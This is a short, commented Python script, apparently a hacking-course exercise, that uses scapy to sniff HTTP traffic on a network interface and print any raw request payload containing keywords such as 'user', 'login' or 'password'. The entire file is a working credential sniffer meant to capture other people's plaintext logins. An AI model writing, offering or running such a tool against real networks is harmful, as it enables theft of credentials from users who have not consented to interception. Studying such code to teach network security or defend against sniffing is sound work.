
#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=processSniffedPacket)
#iface= interface I want to sniff, store=false to not store the sniffs data, prn=another Function to call

def processSniffedPacket(packet):
    if packet.haslayer(http.HTTPRequest): #this filter will check if the packet has HTTP will print the packet
        if packet.haslayer(scapy.Raw): # tthe password stored in the raw field
            load = packet[scapy.Raw].load #this filter to store and print the load
            keyword = ['usernmae','user', 'login', 'password', 'pass']
            for key in keyword:
                if key in load:
                    print('\nHere you will find the userName and the Password:\n\n-___ ' + 
                    load+'_--') 
                    break

sniff("en0") # here you have to specify the interface that you want to capture the traffic on




















